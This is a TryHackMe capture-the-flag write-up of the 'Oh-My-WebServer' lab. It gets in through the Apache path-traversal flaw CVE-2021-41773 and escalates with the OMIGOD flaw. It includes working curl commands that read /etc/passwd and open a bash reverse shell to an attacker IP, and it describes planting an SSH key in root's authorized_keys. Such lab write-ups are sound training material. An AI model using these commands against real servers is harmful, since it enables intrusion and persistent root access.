---
title: Oh-My-WebServer TryHackMe Writeup
tags: [writeup,tryhackme,apache,linux,omigod,cve-2021-41773]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/1.png)

## Scanning
We run nmap on all ports with scripts and software versions.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/2.png)

## Enumeration
We access the website and find this page of an active web server:
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/3.png)

We launch **dirsearch** to search for existing directories or files that may be relevant for other attacks.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/4.png)


## Exploitation
Exploited vulnerability CVE-2021-41773

#### PoC
```bash 
curl -v 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/5.png)

### Reverse shell
```bash
curl -v 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.8.246.129/443 0>&1' -H "Content-Type: text/plain"
```
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/6.png)

### Attack Machine
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/7.png)

It looks like we are on a docker machine and we will need to exit the docker and connect to the host machine.

## Privilege Escalation
There is a script in "*/tmp*"
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/8.png)


### Exploit: [https://github.com/midoxnet/CVE-2021-38647](https://github.com/midoxnet/CVE-2021-38647)

#### PoC
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/9.png)

We list the root directory, we could "cheat" and read the flag directly, but the idea is to exploit the vulnerability and get privilege escalation as root.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/10.png)

We see that the "*id_rsa*" file does not exist, but the "*authorized_keys*" file does exist, remember that the machine has the **SSH** service open, so we will take advantage of the vulnerability to transfer our public key to the file and enter by **SSH** with the "*root*" user.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/11.png)

We put our public key in the file "*authorized_keys*" exploiting the vulnerability "**OMIGOD**".
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/12.png)

We connect via **SSH** with our private key and read the root flag.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/13.png)

I almost forgot! We still need to identify the user flag, let's do a **find** in the root directory and we will get it easily.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Oh-My-WebServer/14.png)



